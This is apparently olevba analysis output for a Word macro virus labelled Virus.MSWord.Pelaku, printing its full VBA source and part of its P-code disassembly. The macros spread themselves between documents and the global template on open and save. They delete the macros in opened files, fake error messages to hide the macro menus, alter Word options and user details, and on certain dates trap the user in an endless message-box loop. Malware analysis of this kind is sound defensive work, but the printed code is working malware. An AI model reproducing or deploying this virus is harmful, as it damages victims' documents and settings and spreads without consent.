olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pelaku
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pelaku - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToolsCustomize.bas 
in file: Virus.MSWord.Pelaku - OLE stream: 'Macros/VBA/ToolsCustomize'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsCustomize.MAIN"
Dim Pesan$
Pesan$ = "No such customize or command"
    WordBasic.MsgBox Pesan$, "NdeKlaimber Customize Err ##", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Pelaku - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
Dim Pesan$
Pesan$ = "No such template or command"
    WordBasic.MsgBox Pesan$, "NdeKlaimber Template Err ##", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Pelaku - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
Dim Pesan$
Pesan$ = "No such macro or command"
    WordBasic.MsgBox Pesan$, "NdeKlaimber Macro Err ##", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Pelaku - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim Lakukan
Dim NFile$
Dim NMakro$
WordBasic.FileSave
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
Lakukan = WordBasic.Dialog.FileSaveAs(dlg)
If Lakukan Then
    dlg.Format = 1
    WordBasic.FileSaveAs dlg
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy "Global:FileMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", NMakro$
End If
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileMacro.bas 
in file: Virus.MSWord.Pelaku - OLE stream: 'Macros/VBA/FileMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileMacro.MAIN"
Dim Pesan$
Pesan$ = "No such macro or command"
    WordBasic.MsgBox Pesan$, "NdeKlaimber Macro Err ##", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Pelaku - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim Lakukan
Dim NFile$
Dim NMakro$
WordBasic.FileSave
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
Lakukan = WordBasic.Dialog.FileSaveAs(dlg)
If Lakukan Then
    dlg.Format = 1
    WordBasic.FileSaveAs dlg
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy "Global:FileMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", NMakro$
End If
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Pelaku - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim TotalMacro
Dim i
Dim MN$
Dim FN$
Dim NFile$
Dim NMakro$
ReDim BadMacro__$(20)
WordBasic.DisableAutoMacros 1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
On Error GoTo -1: On Error GoTo Akhir
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
TotalMacro = 0
For i = 1 To WordBasic.CountMacros(1)
    MN$ = WordBasic.[MacroName$](i, 1)
    BadMacro__$(i) = MN$
    TotalMacro = TotalMacro + 1
Next i
FN$ = WordBasic.[FileName$]()
If TotalMacro >= 1 Then
    For i = 1 To TotalMacro
        On Error GoTo -1: On Error GoTo Akhir
        WordBasic.Organizer Delete:=1, Source:=FN$, Name:=BadMacro__$(i), Tab:=3
    Next i
WordBasic.FileSave
End If
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy "Global:FileMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", NMakro$
Akhir:
WordBasic.FileSave
WordBasic.DisableAutoMacros 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Pelaku - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim NFile$
Dim NMakro$
NFile$ = WordBasic.[FileName$]()
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy NMakro$, "Global:FileMacro"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Pelaku - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
Dim Tgl
Dim Bln
Dim Thn
Dim Jam
Dim Lebar
Dim Tinggi
Dim BarOK
Dim LebOK
Dim Pelaku$
WordBasic.DisableInput 1
WordBasic.DisableAutoMacros 0
Tgl = WordBasic.Day(WordBasic.Now())
Bln = WordBasic.Month(WordBasic.Now())
Thn = WordBasic.Year(WordBasic.Now())
Jam = WordBasic.Hour(WordBasic.Now())
Dim Pesan1$, Pesan2$, Pesan3$, Pesan4$, Pelaku1$, Pelaku2$
Pesan1$ = "Berawal dari sebuah kepedihan... NdeKlaimber™ dicampakkan dan dihinakan... terpuruk bagaikan sampah busuk... NdeKlaimber™ merintih dengan segumpal dendam mendidih !!!"
Pesan2$ = "Kini saatnya NdeKlaimber™ menunjukkan... masih adanya kekuatan untuk membungkam mulut-mulut tak berperasaan... sebab hasrat untuk menjadi yang terbaik adalah sesuatu yang sangat manusiawi... NdeKlaimber™ manangis harus melibatkan semua orang."
Pesan3$ = "©1997 NdeKlaimber™                  I'm Coming..."
Pelaku1$ = "NdeKlaimber"
Pelaku2$ = "Pakis Pratiwi"
If Thn < 1998 Then GoTo HUT
If Jam < 19 Then GoTo Akhir
Dim dlg As Object
    Lebar = 400
    Tinggi = 200
    BarOK = Tinggi - 25
    LebOK = Lebar - 40
    WordBasic.BeginDialog Lebar, Tinggi, " NdeKlaimber Menggugat ..."
        WordBasic.Text 20, 10, LebOK, 150, Pesan1$
        WordBasic.Text 20, 78, LebOK, 120, Pesan2$
        WordBasic.Text 20, 160, LebOK, 20, Pesan3$
        WordBasic.OKButton 20, BarOK, LebOK, 20
    WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog
WordBasic.Dialog.UserDialog dlg
HUT:
If Tgl = 20 And Bln = 11 Then
    Pelaku$ = Pelaku1$
    GoTo Ultah
ElseIf Tgl = 19 And Bln = 8 Then
    Pelaku$ = Pelaku2$
    GoTo Ultah
End If
GoTo Lanjut
Ultah:
    Pesan4$ = "Hari ini " + Pelaku$ + " merayakan Hari Ulang Tahun... Matikan komputer, tinggalkan semua pekerjaan, istirahatkan pikiran, ucapkan selamat kepada " + Pelaku$ + "."
    WordBasic.Beep
    WordBasic.MsgBox Pesan4$, "Happy Birthday, " + Pelaku$ + "...", 16
    GoTo Ultah
Lanjut:
WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="5", Password:="", WritePassword:="", RecommendReadOnly:=0
WordBasic.ToolsOptionsGeneral Pagination:=1, WPHelp:=0, WPDocNavKeys:=0, BlueScreen:=0, ErrorBeeps:=1, Effects3d:=1, UpdateLinks:=1, SendMailAttach:=1, RecentFiles:=0, RecentFileCount:="", Units:=1, ButtonFieldClicks:=-1
WordBasic.ToolsOptionsUserInfo Name:="Pakis Pratiwi", Initials:="Tiwi", Address:="Pupus sudah asa NdeKlaimber™ mencari" + Chr(13) + "Alamat nyata belum jua terberi" + Chr(13) + "Kalau saudaraku sudi memberi" + Chr(13) + "Informasi NdeKlaimber™ menanti" + Chr(13) + "Seribu hatur kasih NdeKlaimber™ pasti"
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Pelaku
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/ToolsCustomize - 1360 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Pesan
' Line #3:
' 	LitStr 0x001C "No such customize or command"
' 	St Pesan$ 
' Line #4:
' 	Ld Pesan$ 
' 	LitStr 0x001C "NdeKlaimber Customize Err ##"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #5:
' 	EndSub 
' Macros/VBA/FileTemplates - 1353 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Pesan
' Line #3:
' 	LitStr 0x001B "No such template or command"
' 	St Pesan$ 
' Line #4:
' 	Ld Pesan$ 
' 	LitStr 0x001B "NdeKlaimber Template Err ##"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #5:
' 	EndSub 
' Macros/VBA/ToolsMacro - 1341 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Pesan
' Line #3:
' 	LitStr 0x0018 "No such macro or command"
' 	St Pesan$ 
' Line #4:
' 	Ld Pesan$ 
' 	LitStr 0x0018 "NdeKlaimber Macro Err ##"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #5:
' 	EndSub 
' Macros/VBA/FileSaveAs - 3005 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Lakukan
' Line #3:
' 	Dim 
' 	VarDefn NFile
' Line #4:
' 	Dim 
' 	VarDefn NMakro
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #6:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	St Lakukan 
' Line #9:
' 	Ld Lakukan 
' 	IfBlock 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #13:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	St NMakro$ 
' Line #14:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #16:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #17:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #19:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St NMakro$ 
' Line #20:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #22:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St NMakro$ 
' Line #23:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #25:
' 	Ld NFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #26:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #28:
' 	Ld NFile$ 
' 	LitStr 0x000E ":FileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #29:
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #31:
' 	Ld NFile$ 
' 	LitStr 0x000A ":FileMacro"
' 	Add 
' 	St NMakro$ 
' Line #32:
' 	LitStr 0x0010 "Global:FileMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #34:
' 	Ld NFile$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #35:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #37:
' 	Ld NFile$ 
' 	LitStr 0x000F ":ToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #38:
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Label Akhir 
' Line #41:
' 	EndSub 
' Macros/VBA/FileMacro - 1340 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Pesan
' Line #3:
' 	LitStr 0x0018 "No such macro or command"
' 	St Pesan$ 
' Line #4:
' 	Ld Pesan$ 
' 	LitStr 0x0018 "NdeKlaimber Macro Err ##"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #5:
' 	EndSub 
' Macros/VBA/FileSave - 3008 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Lakukan
' Line #3:
' 	Dim 
' 	VarDefn NFile
' Line #4:
' 	Dim 
' 	VarDefn NMakro
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #6:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	St Lakukan 
' Line #9:
' 	Ld Lakukan 
' 	IfBlock 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #13:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	St NMakro$ 
' Line #14:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #16:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #17:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #19:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	St NMakro$ 
' Line #20:
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #22:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	St NMakro$ 
' Line #23:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #25:
' 	Ld NFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #26:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #28:
' 	Ld NFile$ 
' 	LitStr 0x000E ":FileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #29:
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #31:
' 	Ld NFile$ 
' 	LitStr 0x000A ":FileMacro"
' 	Add 
' 	St NMakro$ 
' Line #32:
' 	LitStr 0x0010 "Global:FileMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #34:
' 	Ld NFile$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #35:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #37:
' 	Ld NFile$ 
' 	LitStr 0x000F ":ToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #38:
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Label Akhir 
' Line #41:
' 	EndSub 
' Macros/VBA/FileOpen - 3861 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn TotalMacro
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn MN
' Line #5:
' 	Dim 
' 	VarDefn FN
' Line #6:
' 	Dim 
' 	VarDefn NFile
' Line #7:
' 	Dim 
' 	VarDefn NMakro
' Line #8:
' 	OptionBase 
' 	LitDI2 0x0014 
' 	Redim BadMacro__$ 0x0001 (As String)
' Line #9:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #10:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #12:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #13:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #14:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #15:
' 	LitDI2 0x0000 
' 	St TotalMacro 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #17:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St MN$ 
' Line #18:
' 	Ld MN$ 
' 	Ld i 
' 	ArgsSt BadMacro__$ 0x0001 
' Line #19:
' 	Ld TotalMacro 
' 	LitDI2 0x0001 
' 	Add 
' 	St TotalMacro 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St FN$ 
' Line #22:
' 	Ld TotalMacro 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TotalMacro 
' 	For 
' Line #24:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Akhir 
' Line #25:
